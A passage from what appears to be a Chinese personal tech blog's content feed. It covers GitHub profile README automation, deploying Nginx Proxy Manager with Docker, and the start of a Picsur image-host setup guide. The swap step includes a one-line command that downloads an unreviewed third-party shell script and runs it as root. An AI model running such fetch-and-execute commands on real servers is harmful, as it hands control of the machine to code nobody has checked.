class="string">anmol098/waka-readme-stats@master</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">WAKATIME_API_KEY:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.WAKATIME_API_KEY</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">GH_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GH_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">SHOW_LINES_OF_CODE :</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">          <span class="attr">SHOW_PROFILE_VIEWS :</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">          <span class="attr">SHOW_LANGUAGE_PER_REPO :</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">          <span class="attr">SHOW_LOC_CHART :</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">          <span class="attr">SHOW_SHORT_INFO :</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">          <span class="attr">SHOW_PROJECTS :</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">          <span class="attr">SHOW_TOTAL_CODE_TIME :</span> <span class="string">&quot;False&quot;</span></span><br></pre></td></tr></table></figure></li><li>这里的<code>GH_TOKEN</code>直接使用之前创建的，所以不需要再生成新的Token了</li><li>按上文步骤在仓库的Setting-&gt;Secrets-&gt;Actions-&gt;<strong>Repository secrets</strong>中添加<code>WAKATIME_API_KEY</code>，值就是wakatime官网<code>Setting</code>里面的<code>Secret API Key</code><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab94251ce6b.png"/></div></div></li><li>创建完提交代码到仓库，并尝试运行，看看是否配置成功。</li><li>在<code>README.md</code>文件引用，<strong>这里的引用方式不太一样</strong>，在想要添加内容的地方插入下面代码，内容最终会添加到两个注释之间<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--START_SECTION:waka--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--END_SECTION:waka--&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="Social-Readme"><a href="#Social-Readme" class="headerlink" title="Social Readme"></a>Social Readme</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab8221232d4.png"/></div></div><p>在GitHub首页展示博客等个人网站的最新动态信息 –&gt; <a href="https://github.com/zylele/social-readme">源码传送门</a></p><ol><li>在项目根目录下创建<code>/.github/workflows/social.yml</code>文件，将以下代码复制到该文件中：<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Social</span> <span class="string">Readme</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&#x27;0 16 * * *&#x27;</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">permissions:</span></span><br><span class="line">  <span class="attr">contents:</span> <span class="string">write</span> <span class="comment"># To write the generated contents to the readme</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">update-readme:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">zylele/social-readme@master</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">blog_rss_link:</span> <span class="string">https://blog.xxfer.cn/rss.xml</span></span><br><span class="line">          <span class="attr">blog_limit:</span> <span class="number">6</span> <span class="comment"># blog数量</span></span><br><span class="line">          <span class="attr">douban_name:</span> <span class="string">xxferyyds</span></span><br><span class="line">          <span class="attr">douban_limit:</span> <span class="number">5</span> <span class="comment"># 豆瓣最新动态数量</span></span><br><span class="line">          <span class="attr">commit_message:</span> <span class="string">Updated</span> <span class="string">douban</span> <span class="comment"># commit说明</span></span><br></pre></td></tr></table></figure></li><li>这一步不需要生成Token</li><li>需要提供网站的rss文件，比如上面是我的博客rss链接。豆瓣只需要提供username即可。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.xxfer.cn/rss.xml</span><br></pre></td></tr></table></figure></li><li>在<code>README.md</code>文件中引用，引用方式和wakatime类似<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- START_SECTION:blog --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- END_SECTION:blog --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- START_SECTION:douban --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- END_SECTION:douban --&gt;</span></span><br></pre></td></tr></table></figure></li><li>创建完提交代码到仓库，并尝试运行，看看是否配置成功。</li></ol>              </div>            </details><h2 id="API的使用"><a href="#API的使用" class="headerlink" title="API的使用"></a>API的使用</h2><p>由于DIY过程中有很多的API使用，这些需要用到Token和工作流，如果又不理解的同学可以参考<a href="https://blog.xxfer.cn/posts/9a2a157c.html">利用Github_Token玩转仓库API</a>和<a href="https://blog.xxfer.cn/posts/3c96c005.html">如何使用Github Actions提高独立开发效率？</a></p><h2 id="案例仓库"><a href="#案例仓库" class="headerlink" title="案例仓库"></a>案例仓库</h2><ul><li><a href="https://github.com/abhisheknaiidu/awesome-github-profile-readme">https://github.com/abhisheknaiidu/awesome-github-profile-readme</a></li><li><a href="https://github.com/eryajf/awesome-github-profile-readme-chinese">https://github.com/eryajf/awesome-github-profile-readme-chinese</a></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://blog.sunguoqi.com/posts/f3b61b38/">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">打造个性化的GitHub首页</div>            <div class="tag-link-sitename">小孙同学</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DIY </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反向代理神器：Nginx Proxy Manager</title>
      <link href="/posts/79f9b780.html"/>
      <url>/posts/79f9b780.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e860a379515.png</cover>
      <date>Wed Jan 17 2024 15:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>怎么样才能把 IP + 端口变成域名来访问？<br>答案是用反向代理。</p><p>代理就是第三方，一般分为正向代理和反向代理两种。<br><strong>正向代理面向客户端，而反向代理面向的是服务器。</strong>可以学习下面这个视频：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1SM411X7ye/?spm_id_from=333.337.search-card.all.click&vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">什么是正向代理？什么是反向代理？</div>            <div class="tag-link-sitename">猪猫FatCat</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h2 id="Nginx-Proxy-Manager"><a href="#Nginx-Proxy-Manager" class="headerlink" title="Nginx Proxy Manager"></a>Nginx Proxy Manager</h2><p>官网：<a href="https://nginxproxymanager.com/">https://nginxproxymanager.com/</a><br>门槛极低，操作简单，不需要你掌握很复杂的 Nginx 配置知识，只需要几步就能很轻松完成反向代理的设置和 SSL 证书的部署。</p><h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><p>服务器：阿里云服务器<br>操作系统：Debian 11</p><h2 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h2><h3 id="添加-SWAP-虚拟内存"><a href="#添加-SWAP-虚拟内存" class="headerlink" title="添加 SWAP 虚拟内存"></a>添加 SWAP 虚拟内存</h3><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p><strong>如果服务器内存比较小，建议配置这一步。</strong>否则，可以忽略此步。</p></div><p>设置 SWAP 可以用脚本:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O box.sh https://raw.githubusercontent.com/BlueSkyXN/SKY-BOX/main/box.sh &amp;&amp; <span class="built_in">chmod</span> +x box.sh &amp;&amp; clear &amp;&amp; ./box.sh</span><br></pre></td></tr></table></figure><p>选择 18，然后输入你想要扩容的数值即可。<strong>输入的数值单位为MB，即输入1024，就是扩容1GB</strong></p><h3 id="升级-packages"><a href="#升级-packages" class="headerlink" title="升级 packages"></a>升级 packages</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -i <span class="comment"># 切换到 root 用户</span></span><br><span class="line"></span><br><span class="line">apt update -y  <span class="comment"># 升级 packages</span></span><br><span class="line"></span><br><span class="line">apt install wget curl sudo vim git -y  <span class="comment"># Debian 系统比较干净，安装常用的软件</span></span><br></pre></td></tr></table></figure><h3 id="安装-Docker和Docker-compose-环境"><a href="#安装-Docker和Docker-compose-环境" class="headerlink" title="安装 Docker和Docker-compose 环境"></a>安装 Docker和Docker-compose 环境</h3><p>参考这篇<a href="https://u.sb/debian-install-docker/">博客</a></p><h3 id="安装-Nginx-Proxy-Manager"><a href="#安装-Nginx-Proxy-Manager" class="headerlink" title="安装 Nginx Proxy Manager"></a>安装 Nginx Proxy Manager</h3><ul><li><p>创建一下安装的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/npm</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/npm</span><br></pre></td></tr></table></figure></li><li><p>编写yaml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><p>英文输入法下，按 <code>i</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&#x27;jc21/nginx-proxy-manager:latest&#x27;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;80:80&#x27;</span>  <span class="comment"># 保持默认即可，不建议修改左侧的80</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;81:81&#x27;</span>  <span class="comment"># 冒号左边可以改成自己服务器未被占用的端口</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;443:443&#x27;</span> <span class="comment"># 保持默认即可，不建议修改左侧的443</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./data:/data</span> <span class="comment"># 冒号左边可以改路径，现在是表示把数据存放在在当前文件夹下的 data 文件夹中</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./letsencrypt:/etc/letsencrypt</span>  <span class="comment"># 冒号左边可以改路径，现在是表示把数据存放在在当前文件夹下的 letsencrypt 文件夹中</span></span><br></pre></td></tr></table></figure><p>按一下 <code>esc</code>，然后 <code>:wq</code> 保存退出。</p></li><li><p>打开服务器防火墙并访问网页（非必需但很重要）</p></li></ul><p><strong>确保自己使用的服务器已经将上面的yaml文件中的端口都开启了</strong>，否则后面网页会访问不了。</p><p>有的服务器厂商默认关闭不常用的端口，所以需要手动打开。阿里云服务器是在安全组中添加规则开放端口，可以参考<a href="https://developer.aliyun.com/article/1209367">这里</a>，最好是参考所使用服务商提供的官方文档。</p><h3 id="运行并访问-Nginx-Proxy-Manager"><a href="#运行并访问-Nginx-Proxy-Manager" class="headerlink" title="运行并访问 Nginx Proxy Manager"></a>运行并访问 Nginx Proxy Manager</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/npm   <span class="comment"># 来到 dockercompose 文件所在的文件夹下</span></span><br><span class="line"></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><p>开启成功以后，理论上就可以输入 <code>http:// + 服务器ip:81</code> 访问了。</p><p>默认登陆名和密码：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Email:    admin@example.com</span><br><span class="line">Password: changeme</span><br></pre></td></tr></table></figure><div class="note red anzhiyufont anshiyu-icon-dengpao simple"><ol><li>不知道服务器 IP，可以直接在命令行输入：curl ip.sb，会显示当前服务器的 IP。</li><li>遇到访问不了的情况，请再次检查在宝塔面板的防火墙或服务商的后台防火墙<strong>是否打开对应了端口</strong>。</li></ol></div><h2 id="今后更新-Nginx-Proxy-Manager"><a href="#今后更新-Nginx-Proxy-Manager" class="headerlink" title="今后更新 Nginx Proxy Manager"></a>今后更新 Nginx Proxy Manager</h2><p>Docker部署的应用更新都很方便</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/npm</span><br><span class="line"></span><br><span class="line">docker-compose down </span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> -r /root/data/docker_data/npm /root/data/docker_data/npm.archive  <span class="comment"># 万事先备份，以防万一</span></span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose up -d    <span class="comment"># 请不要使用 docker-compose stop 来停止容器，因为这么做需要额外的时间等待容器停止；docker-compose up -d 直接升级容器时会自动停止并立刻重建新的容器，完全没有必要浪费那些时间。</span></span><br><span class="line"></span><br><span class="line">docker image prune  <span class="comment"># prune 命令用来删除不再使用的 docker 对象。删除所有未被 tag 标记和未被容器使用的镜像</span></span><br></pre></td></tr></table></figure><p>提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARNING! This will remove all dangling images.</span><br><span class="line">Are you sure you want to <span class="built_in">continue</span>? [y/N] </span><br></pre></td></tr></table></figure><p>输入 <code>y</code></p><h2 id="卸载-Nginx-Proxy-Manager"><a href="#卸载-Nginx-Proxy-Manager" class="headerlink" title="卸载 Nginx Proxy Manager"></a>卸载 Nginx Proxy Manager</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/npm</span><br><span class="line"></span><br><span class="line">docker-compose down </span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf /root/data/docker_data/npm  <span class="comment"># 完全删除映射到本地的数据</span></span><br></pre></td></tr></table></figure><p>可以卸载得很干净。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>本篇博客只是简单搭建一下Nginx Proxy Manager，已经能够使用它来做反向代理了。关于它的具体使用可能后面会更，大家也可以自己研究一下。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> ECS </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Picsur imgur：docker部署简单易管理的图床项目</title>
      <link href="/posts/4c41eeca.html"/>
      <url>/posts/4c41eeca.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e8606e187ec.png</cover>
      <date>Mon Jan 15 2024 20:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<div class="note blue anzhiyufont anzhiyu-icon-fan simple"><p>本篇博客所有图片均存放在picsur图床上，目前感觉良好。另外，由于我的服务器硬盘容量有限，所以目前只是自用。如果想要体验几天，试试好不好用，可以QQ联系我，可以开几个小号供大家体验。</p></div><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>前段时间推荐了两种图床方案：<a href="https://blog.xxfer.cn/posts/a008ab16.html">npm图床</a>和<a href="https://blog.xxfer.cn/posts/92211228.html">jsDelivr图床</a><br>可是使用的感受并不好，如果配合CDN进行缓存可能效果还行，但是没有缓存策略的话图片有时候都难以加载。所以就像我之前所说，稳定的方案肯定是要结合云存储的，当然也可以是免费图床也可以是值得信赖的低价图床。对于没有服务器的同学，我目前比较推荐使用的是：</p><ul><li>免费图床：<a href="https://www.freeimg.cn/">Freeimg图床</a></li><li>付费图床：<a href="https://image.anheyu.com/">安知鱼图床</a>和杜老师的<a href="https://7bu.top/">去不图床</a></li></ul><p>这些图床其实都是基于国人开发的<a href="https://www.lsky.pro/">兰空图床</a>项目搭建的，有服务器的同学可以试试。不过它比较适合多人使用，自用的话也可以，但是感觉有点大材小用了。</p><p>所以，今天想要分享的就是一个适合自用的开源图床项目——<a href="https://github.com/CaramelFur/Picsur">Picsur</a>，这是国外某位大佬开发的，目前还没有汉化版，不过词汇量不大，实在不习惯的话，可以使用浏览器自带的翻译功能。另外，这个项目本就是这位大佬找遍了GitHub，但是没有找到好用的图床项目，才用PHP写了这个项目。所以，我感觉外国程序员还是比较纯粹的，大家不必担心挂马什么的，可以放心使用。</p><p>我使用它的原因：</p><ul><li>Freeimg图床暂时不支持webp格式的图片上传，picsur支持</li><li>界面比兰空简单，适合个人搭建使用</li><li>部署在国内服务器上，访问速度当然不慢</li></ul><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>Freeimg图床现已支持webp格式的图片上传</p></div><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><ul><li><p>上传界面，提交后直接上传</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95b2558e14.webp"/></div></div></li><li><p>可以自由设置图片格式，尤其支持webp，至于其他格式，下文会具体介绍</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95b1b2788c.webp"/></div></div></li><li><p>已上传的图片</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95b105561c.webp"/></div></div></li><li><p>支持多种图片操作，还可以设置图片有效期</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95b05a43dc.webp"/></div></div></li><li><p>可以自定义用户组</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95af77d1a9.webp"/></div></div></li></ul><p><strong>还有一些其他功能</strong></p><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>我主要是看重webp格式和它足够轻量简洁这两个优点，比兰空要简约。</p></div><h2 id="功能简介"><a href="#功能简介" class="headerlink" title="功能简介"></a>功能简介</h2><ul><li>支持 docker 一键部署</li><li>匿名上传</li><li>支持多账户</li><li>适当的 CORS 限制：防止恶意的网站通过跨域请求获取或修改用户的信息</li><li>Exif 信息剥离</li><li>支持保留原始图像的能力</li><li>支持多种格式：<ol><li>QOI</li><li>JPG</li><li>PNG</li><li>WEBP（支持动画）</li><li>TIFF</li><li>BMP</li><li>GIF（支持动画）</li><li>支持转换图像</li></ol></li><li>支持编辑图像<ol><li>调整大小</li><li>旋转</li><li>翻转</li><li>去除透明度</li><li>负片效果</li><li>灰度化处理</li><li>可删除图片</li></ol></li><li>正确的数据库迁移</li><li>支持在列表中显示自己的图片</li><li>支持聊天窗口上正确显示预览图</li><li>支持设置图片有效期</li><li>支持 ShareX API</li><li>支持 ARM64 和 AMD64 Docker 镜像</li><li>白色模式（WIP）</li><li>公共画廊（WIP）</li><li>相册（WIP）</li></ul><h3 id="EXIF-是什么？"><a href="#EXIF-是什么？" class="headerlink" title="EXIF 是什么？"></a>EXIF 是什么？</h3><p>EXIF 数据，全称”Exchangeable Image File Format”，是一种包含各种关于照片的信息的数据格式。它可以包含很多有关照片的信息，比如相机制造商、相机型号、照片拍摄日期、ISO 设置、快门速度、焦距，是否使用了闪光灯等等。一些相机还会添加地理位置的 gps 信息。</p><p>正因为 EXIF 数据可能包含这种敏感信息，例如地理位置，所以在分享照片的时候需要小心。如果不希望自己的这些信息被公开，应该在发布照片之前去除这些 EXIF 数据。</p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><ul><li>服务器：我使用的是阿里云的ECS云服务器，其他的VPS都行</li><li>操作系统：Debian 11</li><li>安装好 Docker、Docker-compose（相关脚本），参考这篇<a href="https://u.sb/debian-install-docker/">博客</a></li></ul><p>【非必需但建议】域名一枚，并做好解析到服务器上<br>【非必需】提前安装好宝塔面板海外版本 aapanel，并安装好 Nginx<br>【非必需但建议】安装好 Nginx Proxy Manager（我也是使用docker部署的，有时间写篇博客记录一下）</p><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>既然用作图床，服务器的硬盘当然越大越好，不过自己用的话已经足够使用了。</p></div><h2 id="使用docker部署"><a href="#使用docker部署" class="headerlink" title="使用docker部署"></a>使用docker部署</h2><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>需要事先安装 Docker和Docker compose环境，参考这篇<a href="https://u.sb/debian-install-docker/">博客</a></p></div><h3 id="创建一下安装的目录"><a href="#创建一下安装的目录" class="headerlink" title="创建一下安装的目录"></a>创建一下安装的目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -i                                 <span class="comment">#进入root模式</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/picsur  <span class="comment">#创建文件所在的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/picsur        <span class="comment">#进入文件夹</span></span><br></pre></td></tr></table></figure><p>创建yaml文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><p>按一下键盘<code>i</code>，将以下代码复制到文件中，根据自己需要修改（基本不用修改）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">picsur:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">ghcr.io/caramelfur/picsur:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">picsur</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;8003:8080&#x27;</span> <span class="comment">#8003可以改成服务器上没有用过的端口</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">PICSUR_HOST:</span> <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">      <span class="attr">PICSUR_PORT:</span> <span class="number">8080</span></span><br><span class="line">      <span class="attr">PICSUR_DB_HOST:</span> <span class="string">picsur_postgres</span></span><br><span class="line">      <span class="attr">PICSUR_DB_PORT:</span> <span class="number">5432</span></span><br><span class="line">      <span class="attr">PICSUR_DB_USERNAME:</span> <span class="string">picsur</span></span><br><span class="line">      <span class="attr">PICSUR_DB_PASSWORD:</span> <span class="string">nice-long-strong-passw0rd-here</span>  <span class="comment"># 确保和picsur_postgres:部分的 POSTGRES_PASSWORD 匹配</span></span><br><span class="line">      <span class="attr">PICSUR_DB_DATABASE:</span> <span class="string">picsur</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">## 默认管理员账户是 admin, 这个没法改，密码就是下面这个你设置的</span></span><br><span class="line">      <span class="attr">PICSUR_ADMIN_PASSWORD:</span> <span class="string">different-nice-long-str0n6-passw0rd-here</span>       </span><br><span class="line"></span><br><span class="line">      <span class="comment">## 可选的，如果没有设置会默认生产随机字符</span></span><br><span class="line">      <span class="comment"># PICSUR_JWT_SECRET: CHANGE_ME</span></span><br><span class="line">      <span class="comment"># PICSUR_JWT_EXPIRY: 7d</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">## 最大可以上传的字节数</span></span><br><span class="line">      <span class="attr">PICSUR_MAX_FILE_SIZE:</span> <span class="number">128000000</span>  <span class="comment"># 128 MB</span></span><br><span class="line">      <span class="comment">## No need to touch this, unless you use a custom frontend</span></span><br><span class="line">      <span class="comment"># PICSUR_STATIC_FRONTEND_ROOT: &quot;/picsur/frontend/dist&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">## Warning: Verbose mode might log sensitive data</span></span><br><span class="line">      <span class="comment"># PICSUR_VERBOSE: &quot;true&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    </span><br><span class="line">  <span class="attr">picsur_postgres:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:14-alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">picsur_postgres</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">POSTGRES_DB:</span> <span class="string">picsur</span></span><br><span class="line">      <span class="attr">POSTGRES_PASSWORD:</span> <span class="string">nice-long-strong-passw0rd-here</span></span><br><span class="line">      <span class="attr">POSTGRES_USER:</span> <span class="string">picsur</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./picsur-data:/var/lib/postgresql/data</span>  <span class="comment"># 默认数据存放在当前文件夹下的picsur-data目录中，可以自行修改</span></span><br></pre></td></tr></table></figure><p>修改好之后，<strong>注意切换成英文输入法</strong>，然后按一下<code>esc</code>，然后<code>:wq</code>保存退出。</p><p>一行命令自动部署，docker真的太方便了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d  </span><br></pre></td></tr></table></figure><p><strong>有些操作系统是docker-compose up -d，注意区别</strong></p><h3 id="打开服务器防火墙（非必需）并访问网页"><a href="#打开服务器防火墙（非必需）并访问网页" class="headerlink" 